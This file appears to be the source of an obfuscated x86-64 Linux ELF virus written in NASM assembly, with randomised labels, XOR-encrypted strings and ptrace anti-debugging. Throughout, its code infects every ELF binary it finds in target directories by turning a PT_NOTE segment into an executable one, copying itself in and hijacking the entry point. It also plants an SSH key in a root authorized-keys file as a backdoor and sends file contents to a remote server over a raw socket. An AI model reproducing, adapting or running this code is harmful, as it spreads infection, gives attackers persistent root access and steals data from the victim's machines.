%include "obf_file.inc"
; %include "asm/srcs/pestilence.inc"

bits 64 
default rel

section .text
global _start

_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
call deUWiHc
call UFEEst
test rax, rax
js NcVlwWhm

mov rdx, 0 
mov rsi, KaneSodAg
lea rdi, [rel fDG47cqO] ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
reyFI1m:
call HPRK5EHN
mov rdi, rax
pop rax
call vZnwrEjWc

mov rdx, 0 
mov rsi, Dkik80er
lea rdi, [rel FhHqj]
; mov rdi, FhHqj ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
D96LmEfZ:
call HPRK5EHN
mov rdi, rax
pop rax
call vZnwrEjWc

call NXgEB0pcIa

; jmp Svp5X5d
NcVlwWhm:
POPA 
mov rsp, rbp
pop rbp
DDekcmO4hj:
jmp Svp5X5d

wLpP7SBmf:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
mov rax, r14 
movzx r14, byte [r15 + 107]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 211]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 315]
or rax, r14 
pop r14
pop r15
syscall
push rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_TRACEME 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl Svp5X5d
pop rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_DETACH 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
ret

; take directory to open in rdi-> T4Z4Ja7i

vZnwrEjWc:
; placing PNcqe97 on the stack
push rbp
mov rbp, rsp
sub rsp, PNcqe97_size
lea r8, FAM(PNcqe97.lR1SO7g)
or qword [r8], -1
lea rsi, FAM(PNcqe97.T4Z4Ja7i)
call xHTSndwab ; strcpy(PNcqe97.T4Z4Ja7i(rsi), T4Z4Ja7i(rdi))
cmp rdx, 0 
je VNz60C2P7
call zE7fOph ; strlen(PNcqe97.T4Z4Ja7i(rsi))
add rsi, rax
cmp BYTE [rsi - 1], '/' 
je vvO6Im
mov BYTE [rsi], '/' 
add rsi, 1 

vvO6Im:
mov rdi, rdx
call xHTSndwab

mov rdi, rsp

VNz60C2P7:
mov rax, SYS_OPEN 
mov rsi, O_RDONLY | O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl u2nzjw

lea rdi, FAM(PNcqe97.lR1SO7g) ; en registre le lR1SO7g dans la struct
mov [rdi], rax

VLZ0UpH:
lea r10, FAM(PNcqe97.lR1SO7g) 
lea r9, FAM(PNcqe97.Sz74f4K2jt) ; init Sz74f4K2jt
mov DWORD [r9], 0 
mov rax, SYS_GETDENTS 
mov rdi, qword [r10]
lea rsi, FAM(PNcqe97.nvzbFfnJ)
mov rdx, PAGE_SIZE 
syscall
cmp rax, 0 
jle u2nzjw

lea r10, FAM(PNcqe97.vZTSMja) ; r10 -> (struct PNcqe97.diretents_struct_ptr)
mov [r10], rsi ; PNcqe97.vZTSMja -> PNcqe97.nvzbFfnJ
lea r11, FAM(PNcqe97.SBctk5) ; r11 -> (struct PNcqe97.SBctk5)
mov DWORD [r11], eax 

azH1n:
lea r8, FAM(PNcqe97.Sz74f4K2jt) ; r8 -> total lu de getdents
lea r9, FAM(PNcqe97.SBctk5) ; r9 -> total a lire de getdents
mov r10, FAM(PNcqe97.vZTSMja) ; r10 -> actual dirent struct
lea r11, FAM(PNcqe97.vZTSMja) ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d ; update du total lu dans r8
add qword [r11], r12 ; PNcqe97.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je Mb4wwzUujj
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne tEZKBE

t9rQjKL:
; strlen
mov rsi, rsp
call zE7fOph
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
add rax, 1 
sub rsi, rax
mov rdi, rsp
call xoYipPd

call b7KZoH

jmp tEZKBE

Mb4wwzUujj:
lea rdi, FAM(PNcqe97.T4Z4Ja7i)
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne HBKYexM
cmp BYTE [rdx + 1], 0 
je tEZKBE
cmp BYTE [rdx + 1], 0x2e 
jne HBKYexM
cmp BYTE [rdx + 2], 0 
je tEZKBE

HBKYexM:
call vZnwrEjWc

tEZKBE:
mov r8, FAM(PNcqe97.Sz74f4K2jt)
mov r12, FAM(PNcqe97.SBctk5)
cmp r8d, r12d ; if (total lu >= total getdents)
jge VLZ0UpH
jmp azH1n

u2nzjw:
mov rdi, FAM(PNcqe97.lR1SO7g)
cmp qword rdi, 0 
jle lyZ0qMY26
mov rax, SYS_CLOSE 
syscall
or qword FAM(PNcqe97.lR1SO7g), -1
jmp lyZ0qMY26


lyZ0qMY26:
leave

OSP9c:
ret

b7KZoH:
push rbp
mov rbp, rsp
sub rsp, kXxam_size
lea rax, INF(kXxam.Mluqny)
mov qword [rax], 0 
lea rax, INF(kXxam.lQJp269)
mov byte [rax], 0 
lea rax, INF(kXxam.UyLZ1t2l)
mov qword [rax], 0 

mq06nNN:
mov rax, SYS_OPEN 
mov rdi, rsi
mov rsi, O_RDWR 
xor rdx, rdx
syscall
cmp rax, 0x0 
jl lyZ0qMY26
mov INF(kXxam.ZXURQCYBsw), rax

; === get file size ===
Y8jqaXr:
mov rax, SYS_LSEEK 
mov rdi, INF(kXxam.ZXURQCYBsw)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rsi, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 313]
or rsi, r14 
pop r14
pop r15
mov rdx, SEEK_END 
syscall
cmp rax, 0x0 
jle A6gtpzq
mov INF(kXxam.dB12ZXXWDt), rax
mov INF(kXxam.fv4TFs1), rax

qz6soUDAn:
; rax -> map
mov rsi, rax ; rsi = file_size
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(kXxam.ZXURQCYBsw)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl A6gtpzq
call iL11SG
mov rax, r12
mov rsi, r15
lea r8, INF(kXxam.TRSlQxq)
mov [r8], rax

bnzWTaTL:
cmp dword [rax + 1], 0x02464c45 
jne N2WGc

pBY6nKXJN:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, qword [r14 + WnrtZ.aFp1TvnSVb]
xor rcx, rcx
ORjIkdzHm:
cmp cx, [r15 + WnrtZ.WDZN9wB0g]
jge YsbDkBTaYU 
add r14, Wrhx6_size
inc rcx
jmp ORjIkdzHm
YsbDkBTaYU:
mov INF(kXxam.aiAJTz), r14
xor r9, r9
qVkX3SUusR:
cmp cx, 0 
jle YPx61
Fclu46L9Uu:
bt word [r14], 0 
jnc UjWHo2N
bt qword [r14], 0x20 
jc IZnYbz
UjWHo2N:
dec rcx
sub r14, Wrhx6_size
jmp qVkX3SUusR

YPx61:
mov r9, INF(kXxam.Mluqny)
cmp r9, 0 
je N2WGc
cmp byte INF(kXxam.lQJp269), 1 
je erdbKpH
jmp GgEb3FP82 ; else jmp GgEb3FP82

IZnYbz:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
qDXLBed6:
; r8 -> potential FljGYleW
; r9 == FljGYleW variable
mov r8, r15
add r8, qword [r14 + Wrhx6.QkaVj3qo6]
add r8, qword [r14 + Wrhx6.IVpTRklupU]
sub r8, knxYMul
mov r9, qword [rel FljGYleW]
wx0w0:
cmp qword r9, [r8]
je N2WGc

b7E7W3:
mov r9, INF(kXxam.Mluqny)
test r9, r9
jz siIf8
mov r9, INF(kXxam.lQJp269)
test r9, r9
jz UjWHo2N

siIf8:
; r8 == end of kXxam offset
; r9 == next segment offset
mov r8, qword [r14 + Wrhx6.QkaVj3qo6]
add r8, qword [r14 + Wrhx6.IVpTRklupU]
mov r13, r8 ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, Wrhx6_size
add r9, Wrhx6.QkaVj3qo6
cmp [r9], r8
setb INF(kXxam.lQJp269) ; if ([r9] < r8) { kXxam.lQJp269 = 1) }

UQV4KRDGl6:
; r8 -> kXxam structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (siIf8)
;*r14 -> segment header in header table
lea r8, INF(kXxam.IMHVCkFifU)
mov [r8], cl
lea r8, INF(kXxam.JWSTE)
mov r12, qword [r15 + WnrtZ.BiNot830oh]
mov [r8], r12
lea r8, INF(kXxam.Mluqny)
mov [r8], r13
lea r8, INF(kXxam.XsysSg)
push r9
mov r9, qword [r14 + Wrhx6.FVoofbik]
add r9, qword [r14 + Wrhx6.AiRGm7WGp]
mov [r8], r9
pop r9
lea r8, INF(kXxam.xbcvKBMaN)
mov [r8], r14
jmp UjWHo2N

erdbKpH:
pbLYfF:
mov rax, SYS_FTRUNCATE 
mov rdi, INF(kXxam.ZXURQCYBsw)
lea rsi, INF(kXxam.dB12ZXXWDt)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, qword [rsi]
syscall
pop rsi
cmp rax, 0 
jl N2WGc

mJvxqjhg:
mov rdi, INF(kXxam.TRSlQxq)
mov rax, SYS_UNMAP 
syscall

aSJksGj4rp:
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
mov rsi, INF(kXxam.dB12ZXXWDt) ; rsi = file_size
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(kXxam.ZXURQCYBsw)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl A6gtpzq
lea r8, INF(kXxam.TRSlQxq)
mov [r8], rax

vN6HfFBpr:
mov r14, INF(kXxam.TRSlQxq)
movzx rax, word [r14 + WnrtZ.vAKct]
add r14, qword [r14 + WnrtZ.qx9Dgaweg]
xor rcx, rcx

eretPgRK:
cmp rcx, rax
jge Jr1EpQsh
mov rbx, qword [r14 + NU5rLdL4WV.wcN0den]
add rbx, qword [r14 + NU5rLdL4WV.UjilW6xSSz]
cmp INF(kXxam.UyLZ1t2l), rbx
jge EKsNXS
mov INF(kXxam.UyLZ1t2l), rbx

EKsNXS:
add r14, NU5rLdL4WV_size
inc rcx
jmp eretPgRK

Jr1EpQsh:

fc7Ly5zzM:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(kXxam.TRSlQxq)
movzx rax, word [r14 + WnrtZ.WDZN9wB0g]
add r14, qword [r14 + WnrtZ.aFp1TvnSVb]
xor rcx, rcx

hKaX6:
cmp rcx, rax
jge KiHB5uYc9
cmp dword [r14 + Wrhx6.q4Haz], PT_NOTE 
je FFkE0

xJF10F9QOw:
add r14, Wrhx6_size
inc rcx
jmp hKaX6

KiHB5uYc9:
mov r14, -1 

FFkE0:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl R2dmv88
mov dword [r14 + Wrhx6.q4Haz], PT_LOAD 
mov qword [r14 + Wrhx6.nqTrJMkddY], PF_X | PF_R 
mov qword [r14 + Wrhx6.IVpTRklupU], CODE_LEN 
mov qword [r14 + Wrhx6.AiRGm7WGp], CODE_LEN 
mov qword [r14 + Wrhx6.Oms9D], PAGE_SIZE 
mov rax, INF(kXxam.fv4TFs1)
add rax, PAGE_SIZE 
and rax, -4096
mov qword [r14 + Wrhx6.QkaVj3qo6], rax
mov qword INF(kXxam.Mluqny), rax
mov rax, INF(kXxam.UyLZ1t2l)
add rax, PAGE_SIZE 
and rax, -4096
mov qword INF(kXxam.XsysSg), rax
mov qword [r14 + Wrhx6.FVoofbik], rax
mov qword [r14 + Wrhx6.PghubMf2cD], rax

GgEb3FP82:
kJ0m4:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(kXxam.TRSlQxq)
add r8, WnrtZ.BiNot830oh
mov r10, INF(kXxam.XsysSg)
mov [r8], r10
cmp byte INF(kXxam.lQJp269), 0 
jg bOHZu
mov rdi, CODE_LEN 
call m54S3h

bOHZu:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (zxzpDq - _start)
mov rdi, INF(kXxam.TRSlQxq)
add rdi, INF(kXxam.Mluqny)
lea rsi, [rel _start] ; rsi -> start of our code
mov rcx, CODE_LEN 
cld ; copy from _start to zxzpDq (= !std)
rep movsb

R2dmv88:
; r8 -> DDekcmO4hj instruction's addr (DDekcmO4hj + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(kXxam.TRSlQxq)
add r8, INF(kXxam.Mluqny)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(kXxam.XsysSg)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(kXxam.JWSTE)
sub r9, r10
mov [r8], r9d
jmp N2WGc

m54S3h:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(kXxam.xbcvKBMaN)
push r8 ; save header start for later

; * Update file size *
add r8, qword Wrhx6.IVpTRklupU
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, Wrhx6.AiRGm7WGp
add qword [r8], rdi

ret

; --- privesc + backdoor
NXgEB0pcIa:
; open "/root/.ssh/authorized.key"
; r9 == lR1SO7g
push rbp
mov rbp, rsp
sub rsp, 0x1000 
mov rax, SYS_OPEN 
; mov rdi, qNX8nOAOnl
lea rdi, [rel qNX8nOAOnl]
push rax
push rsi
mov rsi, J2HYBE
kiBhKV:
call HPRK5EHN
mov rdi, rax
pop rsi
pop rax
mov rsi, O_RDWR | O_CREAT 
mov rdx, 600 
syscall
test rax, rax
js lyZ0qMY26
mov r9, rax

cbJfCt:
; *r9 == lR1SO7g
; r10 == size read
; rsi -> buffer
mov rax, SYS_READ 
mov rdi, r9
mov rsi, rbp
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 145]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 353]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je e6cQUbI0i
jl vN0fwushg
mov r10, rax

cb3oPVFpba:
; rcx == nombre d'octet lue
; r11 -> buffer
mov rcx, r10
mov r11, rsi

; for every new line
Kh6hv:
cmp byte [r11], 0xa 
je i3n415ya
inc r11
loop Kh6hv
mov rax, SYS_WRITE 
; mov rsi, yPtFwIEl
lea rsi, [yPtFwIEl]
mov rdx, 1 
syscall
jmp e6cQUbI0i

; cmp the line with pub ssh mroJrI
i3n415ya:
mov byte [r11], 0 
mov rdi, r11
sub rdi, vosJuBtukr - 1 
lea rsi, [rel tLvuO0MlT]
push rax
push rdi
lea rdi, [rel tLvuO0MlT]
mov rsi, vosJuBtukr
YSGhYy3:
call HPRK5EHN
mov rsi, rax
pop rdi
pop rax
push rcx
call s1Ynz1Nf
pop rcx
test rax, rax 
je vN0fwushg
inc r11
dec rcx
jnz Kh6hv
; loop Kh6hv

; if not found write it
e6cQUbI0i:
mov rdi, r9
mov rax, SYS_WRITE 
; lea rsi, [rel tLvuO0MlT]
push rax
push rdi
lea rdi, [rel tLvuO0MlT]
mov rsi, vosJuBtukr
oOGqk:
call HPRK5EHN
mov rsi, rax
pop rdi
pop rax
mov rdx, vosJuBtukr
syscall
mov rax, SYS_WRITE 
lea rsi, [rel yPtFwIEl]
mov rdx, 1 
syscall

vN0fwushg:
mov rax, SYS_CLOSE 
mov rdi, r9
syscall
jmp lyZ0qMY26


ESgbOhl3E:
BG0aeLTTo7:
mov rax, SYS_SOCKET 
mov rdi, AF_INET 
mov rsi, SOCK_STREAM 
xor rdx, rdx
syscall
test rax, rax
js OSP9c
mov rdi, rax

QMZLV57t:
mov rax, SYS_CONNECT 
lea rsi, [rel Bbakfhz]
mov rdx, 16 
syscall
test rax, rax
js Zgf4Eko
mov rax, rdi
ret

eom7XM:
mov rax, SYS_UNMAP 
mov rdi, rsi
mov rsi, rdx
syscall
pop rdi

; (rdi: socket)
Zgf4Eko:
mov rax, SYS_CLOSE 
syscall
mov rax, -1
ret

; extrait les donnees des fichiers via http
iL11SG:
mov r12, rax ; r12 -> maped file_date
push rsi
call BG0aeLTTo7
pop rsi
mov r13, rax
JAx3dJ7T:
cmp r13, 0 
jl OSP9c
d0rOquXA:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
mov rax, SYS_MMAP 
xor rdi, rdi
push rsi
add rsi, CR4kFuzIHu
add rsi, EFhWwSV
add rsi, 10 
mov r15, rsi
mov rdx, PROT_READ | PROT_WRITE 
mov r10, MAP_PRIVATE | MAP_ANONYMOUS 
xor r8, r8
xor r9, r9
syscall

kCnbv:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
mov r14, rax
mov rsi, rax
lea rdi, [rel Vbbq0sg3I]
push rax
push rsi
mov rsi, CR4kFuzIHu
vsh6VH:
call HPRK5EHN
mov rdi, rax
pop rsi
pop rax
call xHTSndwab
pop rax
push rax
add rsi, CR4kFuzIHu - 1 
call m1wWn97
lea rdi, [rel s9ncnZ6AJf]
call xHTSndwab
add rsi, EFhWwSV - 1 
mov rdi, r12
pop rcx
call XHrWgvf

zlWcaf8:
mov rax, SYS_SENDTO 
mov rdi, r13
mov rsi, r14
mov rdx, r15
xor r10, r10
xor r9, r9
syscall
push rdi
jmp eom7XM

; manage kXxam
UFEEst:
push rbp
mov rbp, rsp 
call BG0aeLTTo7
cmp rax, 0 
jl T5yJRP

r2oo2ybN2:
;rdi == sockfd
mov rdi, rax
mov rax, SYS_SENDTO 
push rdi
lea rdi, [rel swCLxSthi]
mov rsi, Ez02jH5ZmU
HCMeh:
call HPRK5EHN
mov rsi, rax
pop rdi
pop rax
mov rdx, Ez02jH5ZmU
xor r10, r10
xor r9, r9
syscall
test rax, rax
js T5yJRP

UDBYWEn:
push rdi
mov rax, 35 
lea rdi, [rel AhKzsWv]
xor rsi, rsi
syscall
pop rdi

rhy5Z:
;* rdi == sockfd
mov rax, SYS_RECVFROM 
sub rsp, 200 
mov rsi, rsp
mov rdx, 200 
xor r10, r10
syscall
test rax, rax
js T5yJRP

qZMpc:
;* rdi == sockfd
mov rsi, rsp
call zE7fOph
add rsp, rax
sub rsp, 2 

cmp WORD [rsp], 0x4b4f 
jne nvBr7OW

T5yJRP:
call Zgf4Eko
mov rax, 0 
jmp lyZ0qMY26

nvBr7OW:
call Zgf4Eko
mov rax, -1
jmp lyZ0qMY26

;;**;;
; rax: int *_map_int_table( void )
deUWiHc:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
mov rax, SYS_MMAP
mov rdi, 0x0
mov rsi, 0x1a0
mov rdx, PROT_READ | PROT_WRITE
mov r10, 0x22
mov r8, -1
mov r9, 0x0
syscall
cmp rax, -1
jl B7oUVPw
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000001
mov dword [rax + 80], 0x00000000
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00460000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00000000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00009800
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000000
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x00000000
mov dword [rax + 232], 0x004c0000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00021000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x00000000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x4b000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00000000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x1f400000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00009600
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x32000000
mov dword [rax + 312], 0x6e000040
mov dword [rax + 316], 0x00000001
mov dword [rax + 320], 0x00000101
mov dword [rax + 324], 0x2e010100
mov dword [rax + 328], 0x02010001
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00450100
mov dword [rax + 340], 0x01200000
mov dword [rax + 344], 0x00010100
mov dword [rax + 348], 0x01000001
mov dword [rax + 352], 0x00580005
mov dword [rax + 356], 0x0100010a
mov dword [rax + 360], 0x0a001001
mov dword [rax + 364], 0x23000101
mov dword [rax + 368], 0x4f02c8c8
mov dword [rax + 372], 0x00010000
mov dword [rax + 376], 0x01000001
mov dword [rax + 380], 0x3c30090a
mov dword [rax + 384], 0x401f0209
mov dword [rax + 388], 0x0a0d007f
mov dword [rax + 392], 0x08038000
mov dword [rax + 396], 0x2c2a290b
mov dword [rax + 400], 0xd9654d2d
mov dword [rax + 404], 0x40020100
mov dword [rax + 408], 0x12080400
mov dword [rax + 412], 0x89071713
B7oUVPw:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
HPRK5EHN:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len mroJrI
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> mroJrI
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose)
mov rdx, 0x03 ; PROT_READ | PROT_WRITE = 1 | 2 = 3
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
mov r8, -1 ; lR1SO7g = -1
xor r9, r9 ; offset = 0
mov rax, 9 ; syscall number for mmap
syscall
cmp rax, 0
jl GzdchU9p
mov r11, rax
lea rsi, mroJrI
mov r9, 0xc
xor rcx, rcx
xor rdx, rdx
WyLim4h2e:
cmp rcx, r12
jge GzdchU9p
mov rax, rcx
xor rdx, rdx
cmp rcx, 0
jne ejCUgYFzM
xor rax, rax
jmp jFMW0F3E
ejCUgYFzM:
div r9
jFMW0F3E:
movzx r10, byte [rsi + rdx] ; r10 == mroJrI[rcx % mroJrI_len]
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp WyLim4h2e
GzdchU9p:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; strcpy(dst:rsi src: rdi)
xoYipPd:
xor rcx, rcx
HVs0Q:
cmp byte[rdi + rcx], 0 
je aEvrvIV
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
add rcx, 1 
jmp HVs0Q
aEvrvIV:
ret

xHTSndwab:
call xoYipPd
mov byte [rsi + rcx], 0 
ret

; strncpy(dst:rsi, src: rdi, count: rcx)
XHrWgvf:
sub rcx, 1 
VYfgB:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop VYfgB
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret

; strlen(str:rsi)
zE7fOph:
xor rcx, rcx

y9qq6f:
cmp byte [rsi + rcx], 0 
je XvNwN
inc rcx
jmp y9qq6f

XvNwN:
mov rax, rcx
ret

; strcmp(rdi, rsi)
s1Ynz1Nf:
xor rcx, rcx
xor rax, rax
WawfeREAc3:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl bEfYf
je bEfYf
jg bEfYf

cmp al, 0 
je bEfYf

add rcx, 1 
jmp WawfeREAc3

bEfYf:
movzx rax, al
movzx r8, bl
sub rax, r8
ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
m1wWn97:
mov r9, 10 
call y9yudq
ret

y9yudq:
cmp rax, 9 
jg rE0nJMZe
mov [rsi], ax
add byte [rsi], 48 
inc rsi
ret

rE0nJMZe:
push rax
xor rdx, rdx
div r9
call y9yudq 
pop rax
push rax
xor rdx, rdx
div r9
mov rax, rdx
call y9yudq 
pop rax
ret
mov [rsi + rcx], rax
N2WGc:
mov rdi, INF(kXxam.TRSlQxq)
mov rsi, INF(kXxam.dB12ZXXWDt)
mov rax, SYS_UNMAP 
syscall
jmp A6gtpzq

A6gtpzq:
mov rax, SYS_CLOSE 
mov rdi, INF(kXxam.ZXURQCYBsw)
syscall
mov qword INF(kXxam.ZXURQCYBsw), -1
jmp lyZ0qMY26

Svp5X5d:
mov rax, 60 
xor rdi, rdi
syscall

mroJrI db 0x38, 0x56, 0x72, 0x25, 0x28, 0x58, 0x62, 0x64, 0x4A, 0x27, 0x5B, 0x70
fDG47cqO db 0x17, 0x22, 0x1F, 0x55, 0x07, 0x2C, 0x07, 0x17, 0x3E, 0x27
KaneSodAg equ $ - fDG47cqO
FhHqj db 0x17, 0x22, 0x1F, 0x55, 0x07, 0x2C, 0x07, 0x17, 0x3E, 0x15, 0x5B
Dkik80er equ $ - FhHqj
yPtFwIEl db 9, 0x0 
Na8pykJ equ $ - yPtFwIEl
ExGbkeB db 0x17, 0x56
